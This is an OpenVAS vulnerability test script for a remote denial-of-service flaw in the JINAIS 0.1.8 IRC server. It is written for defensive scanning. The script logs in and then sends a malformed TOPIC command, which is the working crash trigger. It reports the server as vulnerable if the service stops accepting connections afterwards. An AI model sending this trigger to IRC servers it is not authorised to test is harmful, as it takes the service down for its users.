###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jinais_38972.nasl 8485 2018-01-22 07:57:57Z teissa $
#
# JINAIS IRC Message Remote Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "JINAIS is prone to a remote denial-of-service vulnerability.

An attacker may exploit this issue to crash the application, resulting
in a denial-of-service condition.

JINAIS 0.1.8 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100554");
 script_version("$Revision: 8485 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-22 08:57:57 +0100 (Mon, 22 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-03-26 13:01:50 +0100 (Fri, 26 Mar 2010)");
 script_bugtraq_id(38972);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_name("JINAIS IRC Message Remote Denial Of Service Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38972");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/jinais/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "ircd.nasl");
 script_require_ports("Services/irc", 4002);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

if(safe_checks())exit(0);

port = get_kb_item("Services/irc");
if(!port)port = 4002;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);  
if(!soc)exit(0);

NICK = string("OpenVAS",rand());

send(socket:soc, data:string("NICK ",NICK, "\r\n"));
buf = recv(socket:soc, length:256);

if(buf == NULL)exit(0);

send(socket:soc, data:string("USER ",NICK,"\r\n"));
buf = recv(socket:soc, length:1024);
if(NICK >!< buf)exit(0);

send(socket:soc, data:string("TOPIC #",NICK,"\r\n"));
buf = recv(socket:soc, length:256);
close(soc);

soc1 = open_sock_tcp(port);
if(!soc1) {
  security_message(port:port);
  exit(0);
} else {
  close(soc1);
}  

exit(0);
